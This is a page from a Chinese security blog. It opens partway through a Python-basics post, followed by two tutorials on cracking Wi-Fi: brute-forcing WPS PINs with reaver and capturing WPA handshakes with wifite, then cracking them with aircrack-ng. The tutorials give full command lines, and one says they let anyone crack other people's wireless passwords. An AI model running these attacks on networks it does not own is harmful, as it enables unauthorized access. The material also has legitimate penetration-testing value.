<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break</span> 跳出当前整个循环,且后面的代码不再执行</span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">continue</span> 只跳出当前这一次的循环,继续下一次循环</span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 条件:</span><br><span class="line">	要循环的语句</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	上面的循环被正常执行完,也就是中间没有任何<span class="keyword">break</span>或者<span class="keyword">continue</span>,才会执行<span class="keyword">else</span>里面的东西</span><br></pre></td></tr></table></figure>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">range</span>(起始值,总数,每次迭代的步长)</span><br><span class="line">可专门用来获取指定范围内的数,默认是<span class="number">0</span>开始的</span><br><span class="line"><span class="keyword">for</span> iterm <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>,<span class="number">2</span>):</span><br><span class="line">	<span class="built_in">print</span>(iterm)</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">enumrate</span><span class="params">(可迭代的对象,起始位置[默认从<span class="number">0</span>开始])</span></span> 会把这个可迭代对象的索引及索引对应的值一一遍历出来,如下,前面是索引,后面是索引对应的值</span><br><span class="line"><span class="selector-tag">li</span> = [<span class="string">'redhat'</span>,<span class="string">'debian'</span>,<span class="string">'feodra'</span>,<span class="string">'parrot'</span>,<span class="string">'backbox'</span>,<span class="string">'kali'</span>,<span class="string">'alex'</span>,<span class="string">'sec'</span>]</span><br><span class="line"><span class="keyword">for</span> iterm,fix <span class="keyword">in</span> enumerate(li):</span><br><span class="line">	print(iterm,fix)</span><br></pre></td></tr></table></figure>
<p>0x17 在python钟对字符串进行格式化输出:</p>
<p>第一种[百分号]:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">s</span></span> 代表字符串,但它基本所有类型都能接收,用的最多,一般都用这个</span><br><span class="line"><span class="tag">%<span class="selector-tag">d</span></span> 代表数字,也就是说它只能接受整形</span><br><span class="line"><span class="tag">%<span class="selector-tag">f</span></span> 只能接收小数,浮点数,默认加6位的精度</span><br></pre></td></tr></table></figure></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">common_out = 'Work hard to move yourself %s, work hard to <span class="keyword">do</span> <span class="keyword">nothing</span>, you will succeed %d<span class="string">' % ('</span>klion<span class="string">',100)</span></span><br><span class="line"><span class="string">common_out = '</span><span class="keyword">Work</span> hard <span class="keyword">to</span> <span class="keyword">move</span> yourself %(<span class="keyword">name</span>)s, <span class="keyword">work</span> hard <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">nothing</span>, you will succeed %(<span class="keyword">num</span>)d<span class="string">' % &#123;'</span><span class="keyword">name</span><span class="string">':'</span>sec<span class="string">','</span><span class="keyword">num</span><span class="string">':33&#125;</span></span><br><span class="line"><span class="string">common_out = '</span><span class="keyword">Work</span> hard <span class="keyword">to</span> <span class="keyword">move</span> yourself %s, <span class="keyword">work</span> hard <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">nothing</span>, you will succeed %<span class="number">.3</span>f<span class="string">' % ('</span>klion<span class="string">',1234.23123123)</span></span><br><span class="line"><span class="string">common_out = '</span><span class="keyword">Work</span> hard <span class="keyword">to</span> <span class="keyword">move</span> yourself %s, <span class="keyword">work</span> hard <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">nothing</span>, you will succeed %d%%<span class="string">' % ('</span>klion<span class="string">',100)</span></span><br><span class="line"><span class="string">print(common_out)</span></span><br></pre></td></tr></table></figure>
<p>第二种[format方式]:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:d</span> 整数</span><br><span class="line"><span class="selector-pseudo">:s</span> 字符串</span><br><span class="line"><span class="selector-pseudo">:f</span> 浮点型</span><br><span class="line"><span class="selector-pseudo">:b</span> 二进制输出</span><br><span class="line">*  代表直接传列表</span><br><span class="line">** 代表直接传字典</span><br></pre></td></tr></table></figure></p>
<figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">format_out = <span class="symbol">'Work</span> hard <span class="keyword">to</span> move yourself &#123;name&#125;, work hard <span class="keyword">to</span> <span class="keyword">do</span> nothing, you will succeed &#123;num&#125;<span class="string">'.format(name='</span>sec',num=<span class="number">123</span>)</span><br><span class="line">format_out = <span class="symbol">'Work</span> hard <span class="keyword">to</span> move yourself &#123;name&#125;, work hard <span class="keyword">to</span> <span class="keyword">do</span> nothing &#123;mail&#125;, you will succeed &#123;num&#125;<span class="string">'.format(**&#123;'</span>name':<span class="symbol">'security'</span>,<span class="symbol">'num'</span>:<span class="number">123</span>,<span class="symbol">'mail'</span>:<span class="symbol">'sec</span>@sec.org'&#125;)</span><br><span class="line">print(format_out)</span><br></pre></td></tr></table></figure>
<p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;当你真正熟练掌握了一门脚本语言之后,再去学另一门脚本语言,其实上手用起来是很快的,这些基础语法正常情况下半天就应该搞定了</p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/reaver-crack-pin-code.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/reaver-crack-pin-code.html" itemprop="url">利用reaver破解目标pin码</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-04-17T10:09:10+08:00">
                2015-04-17
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-06-24T23:51:33+08:00">
                2017-06-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/wpa-wpa2-crack/" itemprop="url" rel="index">
                    <span itemprop="name">wpa/wpa2 crack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,003
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>1,说到pin码就不得不提wps,它是一种特殊的无线认证协议,当路由器开启wps功能后,会随机生成一个8位的pin码,通过暴力枚举这个pin码(共11000中可能),就可以达到破解目标wifi的目的,很不错的现象是,现在很多路由器默认就开启了wps功能<br><br><br>关于pin码爆破的具体原理简要分析,如下:<br>&nbsp;&nbsp;前4位为第一部分,第5-7位为第二部分,最后1位为第三部分<br>&nbsp;&nbsp;第一部分的验证跟第二部分没关联,最后1位的结果是根据第二部分计算得出的校验码<br>&nbsp;&nbsp;破解一开始是会先单独对第一部分进行pin码匹配,<br>&nbsp;&nbsp;也就是说先破解前4位pin码,而前4位也就是0000-9999共有10000个组合<br>&nbsp;&nbsp;当前4位pin码确定后再对第二部分进行pin码匹配,<br>&nbsp;&nbsp;再对5-7位进行破解,而5-7位是000-999,共有1000个组合<br>&nbsp;&nbsp;当前7位都确定后,最后1位也会自动得出,即破解完成<br>&nbsp;&nbsp;根据pin码破解的原理,可以看到只需要枚举11000种情况就会必然破解出pin码,<br>&nbsp;&nbsp;从而通过pin得到wifi密码,这么点儿组合对计算机来讲,破解出来是迟早的,不过实际很大程度上还要依赖于目标路由的网络状况和信号强弱<br>&nbsp;&nbsp;<img src="/img/pin.jpg" alt="pin码格式"><br></p>
<p>2,具体的pin码破解流程如下,首先,依然是先开启网卡的监听模式:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airmon-ng start wlan0</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/airmon.png" alt="开启网卡监听模式"><br></p>
<p>3,而后,开始扫描附近所有开启了wps的无线设备,locked状态为’No’的,都可以作为下手的目标<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wash -i wlan0mon --ignore-fcs  这里有时会报fcs错误,加上该选项即可</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sec.png" alt="扫描附近开了wps的无线设备"><br></p>
<p>4,使用reaver工具爆破pin码,关于reaver 一些选项作用如下:<br>&nbsp;&nbsp;-i     监听后的网卡接口名称<br>&nbsp;&nbsp;-b  指定目标无线ap的mac地址<br>&nbsp;&nbsp;-a  自动检测目标AP最佳配置<br>&nbsp;&nbsp;-S  使用最小的DH key(提高破解速度)<br>&nbsp;&nbsp;-vv 显示详细的破解过程<br>&nbsp;&nbsp;-d  即delay每穷举一次的闲置时间预设为1秒<br>&nbsp;&nbsp;-t  即timeout每次穷举等待反馈的最长时间,即破解超时时长<br>&nbsp;&nbsp;-c  指定频道可以方便找到无线信号,如-c 1 指定1频道</p>
<p>根据无线信号强弱针对性的调整下命令:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -a -S -vv -d0 -c 1  		信号非常好</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -a -S -vv -d2 -t 5 -c 1		信号普通</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -a -S -vv -d5 -c 1			信号一般</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b MAC -S -N -vv -c 4</span></span><br><span class="line"><span class="comment"># reaver -i wlan0mon -b DC:EE:06:96:B7:B8 -S -N -vv -c 6</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/reaver_finsal.png" alt="开始爆破pin码"><br></p>
<p>最后,当reaver pin完之后会显示出目标的WPS PIN(正确的pin码)码和WPA PSK密码(正确的wifi密码)<br><br><br>5,假如目标的wpa psk密码被修改了,但wps功能却没有关,pin码也没有改,你还是可以直接用reaver再次获取目标wifi密码,如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># reaver -i mon0 -b mac -p pin码</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h5 id="一点小结"><a href="#一点小结" class="headerlink" title="一点小结:"></a>一点小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,搞清楚具体的破解原理之后,你会发现其实也并没什么实际性的技术含量,只需要写程序组包跑就是了,可能就是验证的过程有点儿复杂需要多花些时间,但工具(reaver)现在别人都已经为我们写好了,我们所能做的,会用即可,仅此而已,另外,个人并也极不建议一开始破解无线的时候就用这个方法,因为它的速度,大家也可以看到了,影响的因素太多,导致了它非常的慢,尤其是对实地渗透来讲,我们可能根本没有那么长的时间等,所以,能用aircrack搞定的就直接用aircrack来搞定,实在搞不定,再考虑这个也不迟,仅仅是个人建议而已……!</p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/auto-crack-wifi.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/auto-crack-wifi.html" itemprop="url">利用wifite脚本全自动获取握手包</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-04-16T10:09:10+08:00">
                2015-04-16
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-10-25T18:44:18+08:00">
                2017-10-25
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/wpa-wpa2-crack/" itemprop="url" rel="index">
                    <span itemprop="name">wpa/wpa2 crack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  878
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>0x01 wifite 脚本仓库地址 [ Kali NetHunter 中可能用的居多 ]:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/derv82/</span>wifite</span><br></pre></td></tr></table></figure></p>
<p>0x02 关于使用wifite脚本的好处<br>&nbsp;&nbsp;&nbsp;&nbsp;你可以不用再像aircrack那样繁琐的手工输入各种命令,而是把一切都交给代码变成一种完全傻瓜式的交互操作,其实,本质上还是在调用的各种外部工具[aircrack]来帮其实现,脚本基于py,关于更多更详细运作细节,请自行看代码,今天的目的主要是教大家怎么快速把它用起来,非常简单,简单到你基本不用懂任何技术就可以随意破解别人的无线密码:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> wifite -h    查看wifite的所有帮助选项</span></span><br></pre></td></tr></table></figure></p>
<p>下面是破解<code>wpa/wpa2</code>相关的一些选项<br><img src="/img/wpa2.png" alt="破解wpa/wpa2的相关帮助"><br>破解古老的<code>wep(基本已淘汰,反正我是没见过)</code>相关选项<br><img src="/img/wep.png" alt="破解wep的相关帮助"><br>关于<code>wps(一种新的认证协议,并非直接使用密码验证而是用pin码,更多内容,请自行谷歌)</code>的一些相关破解选项<br><img src="/img/pin.png" alt="破解wps的相关帮助"><br><br></p>
<p>0x03 关于wifite脚本的具体使用过程,如下,插入事先准备好的无线网卡[同样,务必是aircrack所支持的无线网卡芯片才可以],执行下面的命令:<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span> <span class="comment">wifite</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">wpa</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">mac</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">wpadt</span> <span class="comment">20</span> <span class="literal">-</span><span class="comment">aircrack</span>  <span class="comment">这里暂以破解wpa2为例</span><span class="string">,</span><span class="comment">关于wep和wps的破解请自行尝试</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wifite.png" alt="运行wifite脚本"></p>
<p><code>ctrl+c</code> 即可停止扫描,选择你要破解的无线,几个栏目的意思分别是<br><code>无线编号,无线工作信道,加密类型,信号强弱(值越高信号越强),目标是否启用wps,有无客户端在线(s表示同时有多个客户端在线)</code><br><img src="/img/wfcrack.png" alt="选择要攻击的无线热点"></p>
<p>这里还是用我们自己的wifi来进行测试,选择1,至于之后的事情你就不用管了,它会自动帮你获取握手包文件并保存在当前路径下的hs目录中,如下:<br><img src="/img/crc.png" alt="自动获取握手包"><br><img src="/img/hs.png" alt="握手包位置"></p>
<p>0x04 具体的hash破解过程<br>&nbsp;&nbsp;&nbsp;&nbsp;最后,还是跟之前一样,直接处理下丢给hashcat或者aircrack都行,因为这里只是为了测试,所以就直接丢到aircrack中跑了,另外,有个需要注意的地方,如果你还是像之前那样直接用wpaclean处理,然后再丢给hashcat,破解速度会瞬间下降将近两万倍,其实,我也没搞懂这到底是为啥(懒得看代码,也没那个必要),所以,我个人还是推荐直接手工用aircrack相对比较靠谱,毕竟,越自动化的东西,往往对现实环境的适应力就越差,问题也就越多,不靠谱都是很正常的<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">aircrack-ng</span> <span class="selector-tag">--bssid</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span>  <span class="selector-tag">-w</span> ../<span class="selector-tag">pass</span><span class="selector-class">.txt</span> <span class="selector-tag">klionsec_DC-EE-06-96-B7-B8</span><span class="selector-class">.cap</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/ha.png" alt="握手包位置"><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;不可否认的是,脚本一定程度上确实很方便,但它同时显的很呆笨,里面的每个操作并非都是最适合我们的,对于渗透来讲,我们需要知道的往往是更细节的东西,自动化脚本对于还处在学习阶段的我们,并没什么实际的好处,因为它会严重阻碍你自己思考的习惯,总之,个人此脚本并不建议在实战中使用,除了破解时间的问题,实际测试的时候还有一些其它的小问题,还是那句话,建议直接手工aircrack,也许会更灵活点,不过,在kali nethunter中的表现还是不错的</p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg"
                alt="VK" />
            
              <p class="site-author-name" itemprop="name">VK</p>
              <p class="site-description motion-element" itemprop="description">别惹我,我疯起来连自己都黑！</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">159</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">112</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">107</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:evil-404@protonmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/HackwithGithub" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                安全资讯
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.freebuf.com" title="FreeBuf" target="_blank">FreeBuf</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.secfree.com" title="指尖安全" target="_blank">指尖安全</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.sec-wiki.com" title="SecWiki" target="_blank">SecWiki</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://xz.aliyun.com" title="先知社区" target="_blank">先知社区</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.4hou.com" title="嘶吼" target="_blank">嘶吼</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.anquanke.com" title="安全客" target="_blank">安全客</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.aqniu.com" title="安全牛" target="_blank">安全牛</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.easyaq.com" title="E安全" target="_blank">E安全</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>
       
      

      

<div id="days"></div>
</script>
<script language="javascript">
function show_date_time(){
window.setTimeout("show_date_time()", 1000);
BirthDay=new Date("07/01/2018 15:00:00");
today=new Date();
timeold=(today.getTime()-BirthDay.getTime());
sectimeold=timeold/1000
secondsold=Math.floor(sectimeold);
msPerDay=24*60*60*1000
e_daysold=timeold/msPerDay
daysold=Math.floor(e_daysold);
e_hrsold=(e_daysold-daysold)*24;
hrsold=setzero(Math.floor(e_hrsold));
e_minsold=(e_hrsold-hrsold)*60;
minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
seconds=setzero(Math.floor((e_minsold-minsold)*60));
document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
}
function setzero(i){
if (i<10)
{i="0" + i};
return i;
}
show_date_time();
</script>

  
    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">VK</span>

<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共298.9k字</span>
</div>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://evil-404.github.io/">Evil-404</a> 维护</div>



  <span class="post-meta-divider">|</span>






<span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>



  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v="></script>

  <script type="text/javascript" src="/js/src/motion.js?v="></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>



  


  




	





  





  












  




  
  
  
  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">

  
  
  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
  

  <script src="/js/src/algolia-search.js?v="></script>



  

  

  

  
  

  

  

  

</body>
</html>
